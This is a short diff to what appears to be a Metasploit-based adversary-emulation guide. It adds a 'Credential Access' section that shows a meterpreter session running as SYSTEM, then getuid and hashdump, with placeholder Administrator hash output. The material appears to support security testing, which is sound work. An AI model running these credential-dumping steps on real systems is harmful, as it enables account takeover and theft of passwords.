@@ -104,4 +104,18 @@ meterpreter > migrate 812
 [*] Migrating from 7236 to 812...
 [*] Migration completed successfully.
 ```
+## Credential Access
+
+Execute from session running as SYSTEM and complete Process Injection test first.
+```
+msf6 exploit(multi/handler) > sessions -i N
+[*] Starting interaction with N...
+
+meterpreter > getuid 
+Server username: NT AUTHORITY\SYSTEM
+
+
+meterpreter > hashdump 
+Administrator:500:EXAMPLEb51404eeaad3b435b51404ee:EXAMPLE6ae931b73c59d7e0c089c0:::
+```
 
